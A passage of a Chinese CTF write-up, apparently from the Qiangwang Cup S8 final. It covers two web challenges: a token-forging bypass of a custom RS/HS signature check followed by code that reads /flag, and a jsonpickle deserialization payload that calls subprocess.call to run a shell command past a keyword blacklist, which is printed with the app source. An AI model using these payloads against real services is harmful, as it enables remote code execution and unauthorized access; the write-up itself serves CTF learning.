        hash_obj <span class="token operator">=</span> SHA256<span class="token punctuation">.</span>new<span class="token punctuation">(</span>data_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pkcs1_15<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span><span class="token punctuation">.</span>verify<span class="token punctuation">(</span>hash_obj<span class="token punctuation">,</span> signature<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is valid. Transmitted data:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Signature is invalid."</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">elif</span> alg <span class="token operator">==</span> <span class="token string">'HS'</span><span class="token punctuation">:</span>
        hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
        data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
        hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
        hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> hex_dig <span class="token operator">==</span> signature<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一开始看到有 RS 有 HS，欸是不是要打 RS 转 HS 的 trick 🤓👆</p>
<p>拿个 token 解码测试一下</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">&#123;"username": "aaa", "password": "123"&#125;iÛÕ`Ø&#125;£P5À..ï.Ì.¬?%ÐºFU=×.UT.è57 a8Î¿./òLkntãÝ_©....àm¥£.à-uqð~ºÀ¦Õ.·.äÃº...0..¿#ÐÒfVuº
ÔÙgdðõ%Æìy.Ì.«..v.§~..cßà®².=Ùq#.0ò..Q.¬û.WÌ¶º0Ô.¼ëöþ)¨.òOÛ?ýv´¦.Ë7.d...Øc©.é..1..%ñ.9á&#125;Öû.NÂ.¤v.ü6.ÂÐY.v¿.ðfâ....Ä²¬|Ç´½.º.O.jîíÝq.®G`Ê.ïÅËhã.¯.&lt;\z¯å¨.~q2è|Ä[ãp.&lt;®ç².ùRS-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0IdDl+WgYW49pk+UCoYy
pX4SPvon3Pc9uNgM6htf63pYUKnqcFjm0LqAd5q/+t5Ut5L1P98IZRyRjYF/W98W
rLWQpG2Y2WiQ4/stCx/qtCg+UGoG7ItWMKrUAWxjjwzqun++yZIQ02AeLJzUSbC+
uEEBqvzkXrr4FJvPHpIbWU/hE23nEmRL5pze8I7zym7M38Q3doOPSTsQV15b0Kcp
pt5Fvn3TxQAlWmdARk0sY0GbR/oo80eniQvIlswbPGeORgldbXLY1IAusaTiIenQ
JVU9+//+D9m7OZdoGOeqPLJ7jns9bTX8qwkjtuH0pDREK4Rr+vBFYKSc/TfXraNc
+wIDAQAB
-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到RS加密的公钥</p>
<p>下断点看一下all_data</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">0</span> <span class="token operator">=</span>
<span class="token string">'eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMTIzIn0='</span>
<span class="token number">1</span> <span class="token operator">=</span>
<span class="token string">'nDnHSpDbV3CVBn24/aZQc3lOdxQug5w5zj93isQYXyViMeRLqNPu53sZNGxEjL2rd55B4H7Cc+gQ2x4f/NcZQ8ACVDgtQe5C4be1y7uan2qitc4eQGCkbmmDQeogdJteJCzHeZaePp3Vg9/+U+588A1eQS1/UG5vDawVGLel5UYH6nmZha0zZ2CbrNBbbu3SPaeGDsj/mJscssETStFGx8iEYra3eYh9L3ugEUcP/7D4EVi1EKeu98Mc6IwnwjgxsdmihpuZRZlSI1NUi+TfbjLBLb57WH9dhKOQAr06xO/HhL3U73D8kdVCKCWXMolZZXw8eIkfuvS+5QUNWM7DwQ=='</span>
<span class="token number">2</span> <span class="token operator">=</span>
<span class="token string">'UlM='</span>
<span class="token number">3</span> <span class="token operator">=</span>
<span class="token string">'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyZVVmNzNDVlJPL3RwYjVLSnQ0QgptY2xDSUtWMXNrZGtkQWcwS2I5RGlrRjREeXBwODFLb0hFd2VIUUxRS0RnR0RzZnpQeFI4Qm1vQmV1TlBVZkg2CkRuVDdEQ2dRSlVpaDBVd3hRYVprZWprWW9kY1RZTG9QSlpZK1BnSjRaKzFNZWFOK1FFRG1aUjEzTU5kMy9OaE0KejY3Tk1GYWVaVm1LN2FQQzh5blJXRzVPbFZpU0JDNDUxOG9TcVhsRkx3MU5CR2pnb1N2ZS9FU2VoUStuTlUvdgpwaU1sNnVtUzhZbjlZVytrMU0vbGJ3TWc1N3lydXRGYVh2WmllUG4zSENrd0YzTUF0RkpadEVOL3huaU1FU3pPClZBVmFYZ3EwWHVTYXJZSXU4b2dvU2Q4MUdLNGJmWHdscTZWbXNWSExQRFBvMkRrTmcxS1B2L1Erd05vbHI1SlkKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'</span>
<span class="token builtin">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span>
<span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>好猜测要让解密方式为 HS</del></p>
<p>0 改为 eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ&#x3D;&#x3D;</p>
<p>2 改为 SFM&#x3D;&#x3D;</p>
<p><del>签名部分就是获取的公钥</del></p>
<p>构造出jwt：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9<span class="token punctuation">.</span>eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjMifQ<span class="token operator">==</span><span class="token punctuation">.</span>SFM<span class="token operator">==</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>但是失败了</p>
<p>观察 HS 的加解密部分：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># enc</span>
hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
inputdata <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
signature <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>hex_dig<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># dec</span>
hash_object <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span>
data_bytes <span class="token operator">=</span> <span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
hash_object<span class="token punctuation">.</span>update<span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span>
hex_dig <span class="token operator">=</span> hash_object<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现要先知道 secret 的值才能伪造</p>
<br>

<p>而且这里的加密逻辑都是它自己实现的，不能套用常规的 jwt 思路把 RS 转为 HS</p>
<p>仔细一看对 secret 的操作</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">key <span class="token operator">=</span> secret
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
    key_bytes <span class="token operator">=</span> all_data<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key_bytes<span class="token punctuation">)</span>  <span class="token comment"># bytes</span>
<span class="token comment"># 验证签名</span>
is_valid <span class="token operator">=</span> verify_signature<span class="token punctuation">(</span>key<span class="token punctuation">,</span> json_data<span class="token punctuation">,</span> signature<span class="token punctuation">,</span> alg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>草了，这里传进去的 key 就是公钥，和 secret 没有半点关系，那就简单了，加解密只和算法有关</p>
<p>尝试直接在本地解除限制生成 admin 的 token ，带到靶机上，发现可以登录</p>
<p>然后就拿到 exec 了，接下来的问题是靶机不出网而 <code>print(exec(code))</code> 没有回显</p>
<p>一开始想的是用 sctf 的 trick 在 wsgi server 写内存马，但是整了半天拿不到全局 __globals__，浪费了非常久的时间</p>
<p>最后还是选择找个有调用的方法重写，这里重写 read_html 方法来读flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">util<span class="token punctuation">.</span>read_html<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token operator">+</span>filename<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token operator">+</span>f<span class="token punctuation">:</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241205132441508.png" alt="image-20241205132441508"></p>
<p>然后随便访问一个调用了 read_html 接口即可回显</p>
<h3 id="法二：pyramid内存马"><a href="#法二：pyramid内存马" class="headerlink" title="法二：pyramid内存马"></a>法二：pyramid内存马</h3><hr>
<h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>尝试登录可以得到账密 guest:guest</p>
<p>登录后得到 token，解码得到</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"__main__.Token"</span><span class="token punctuation">,</span> <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"guest"</span><span class="token punctuation">,</span> <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token number">1733378883.1952913</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>除此之外没有其他信息</p>
<p>py&#x2F;object 的部分是数据类的写法，在这里测了半天类一直返回500</p>
<p>github 上搜了一下找到个相关的项目：<a target="_blank" rel="noopener" href="https://github.com/jsonpickle/jsonpickle">https://github.com/jsonpickle/jsonpickle</a></p>
<p>和队友讨论了很久之后猜测是在 timestamp 上做文章，因为每次登录之后都会生成一个 timestamp 可以反复使用，返回 welcome，过一阵时间后就会返回 Invalid token，而当我们直接把 username 改为 admin 的时候就会直接返回 Invalid token</p>
<p>于是需要爆破 timestamp ，这里我交给队友用 yakit 爆出一个 token 就能持久化使用了</p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206091629415.png" alt="image-20241206091629415"></p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206093000087.png" alt="image-20241206093000087"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>
    <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span>
<span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后呢，很明显是要打 jsonpickle 了，有官方的 fuzzing 文档：<a target="_blank" rel="noopener" href="https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md">https://github.com/jsonpickle/jsonpickle/blob/main/fuzzing/README.md</a></p>
<p>貌似没啥用</p>
<p>继续在 github 上搜索：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md">https://github.com/mzfr/vulnhub-writeups/blob/f8fe1d8fb477185db1180e02a128fa88a5ab612e/2019-08-20-symfonos4.md</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/VerSprite/flask-json-pickle">https://github.com/VerSprite/flask-json-pickle</a></p>
<p><a target="_blank" rel="noopener" href="https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/">https://versprite.com/vs-labs/into-the-jar-jsonpickle-exploitation/</a></p>
<p>测试发现 ban 了 reduce、tuple，不过注意到 py&#x2F;object 这里能自己选择类，那么就可以考虑直接调用命令执行类<code>subprocess.call</code></p>
<p>传入参数可以用 py&#x2F;newargsex</p>
<p>无回显，一开始想用盲注读文件的，但是发现反斜杠被 ban 了，那么就很难搞了</p>
<p>测试发现有个 static 文件夹可以访问，那么直接带外</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"py/object"</span><span class="token operator">:</span> <span class="token string">"subprocess.call"</span><span class="token punctuation">,</span> <span class="token property">"py/newargsex"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"cat$&#123;IFS&#125;/app/app.py>/app/static/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token property">"stdout"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>源码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> redirect
<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass
<span class="token keyword">from</span> time <span class="token keyword">import</span> time
<span class="token keyword">import</span> jsonpickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json
<span class="token keyword">import</span> os

<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span>
    password<span class="token punctuation">:</span> <span class="token builtin">str</span>

<span class="token decorator annotation punctuation">@dataclass</span>
<span class="token keyword">class</span> <span class="token class-name">Token</span><span class="token punctuation">:</span>
    username<span class="token punctuation">:</span> <span class="token builtin">str</span>
    timestamp<span class="token punctuation">:</span> <span class="token builtin">int</span>

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
users <span class="token operator">=</span> <span class="token punctuation">[</span>User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> User<span class="token punctuation">(</span><span class="token string">'guest'</span><span class="token punctuation">,</span> <span class="token string">'guest'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
BLACKLIST <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'repr'</span><span class="token punctuation">,</span>
    <span class="token string">'state'</span><span class="token punctuation">,</span>
    <span class="token string">'json'</span><span class="token punctuation">,</span>
    <span class="token string">'reduce'</span><span class="token punctuation">,</span>
    <span class="token string">'tuple'</span><span class="token punctuation">,</span>
    <span class="token string">'nt'</span><span class="token punctuation">,</span>
    <span class="token string">'\\'</span><span class="token punctuation">,</span>
    <span class="token string">'builtins'</span><span class="token punctuation">,</span>
    <span class="token string">'os'</span><span class="token punctuation">,</span>
    <span class="token string">'popen'</span><span class="token punctuation">,</span>
    <span class="token string">'exec'</span><span class="token punctuation">,</span>
    <span class="token string">'eval'</span><span class="token punctuation">,</span>
    <span class="token string">'posix'</span><span class="token punctuation">,</span> 
    <span class="token string">'spawn'</span><span class="token punctuation">,</span>
    <span class="token string">'compile'</span><span class="token punctuation">,</span>
    <span class="token string">'code'</span>
<span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>
    otoken <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span>
    token <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>otoken<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> BLACKLIST<span class="token punctuation">:</span>
        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> token<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>
    

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
        <span class="token keyword">if</span> user<span class="token punctuation">.</span>username <span class="token operator">==</span> username <span class="token keyword">and</span> user<span class="token punctuation">.</span>password <span class="token operator">==</span> password<span class="token punctuation">:</span>
            res <span class="token operator">=</span> app<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span><span class="token string">'Login successful'</span><span class="token punctuation">)</span>
            token <span class="token operator">=</span> Token<span class="token punctuation">(</span>username<span class="token punctuation">,</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            res<span class="token punctuation">.</span>status_code <span class="token operator">=</span> <span class="token number">302</span>
            res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/home'</span>
            <span class="token keyword">return</span> res

    <span class="token keyword">return</span> <span class="token string">'Invalid credentials (guest/guest)'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>
            <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span>
    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/s3Cr3T'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token<span class="token punctuation">:</span>
        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>
            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
if not waf(token):
    return 'Invalid token'
token = jsonpickle.decode(token, safe=True)
if time() - token.timestamp &lt; 60:
    if token.username != 'admin':
        return f'Welcome &#123;token.username&#125;, but you are not admin'
    return 'Welcome admin, there is something in /s3Cr3T'
return 'Invalid token'
'''</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></spa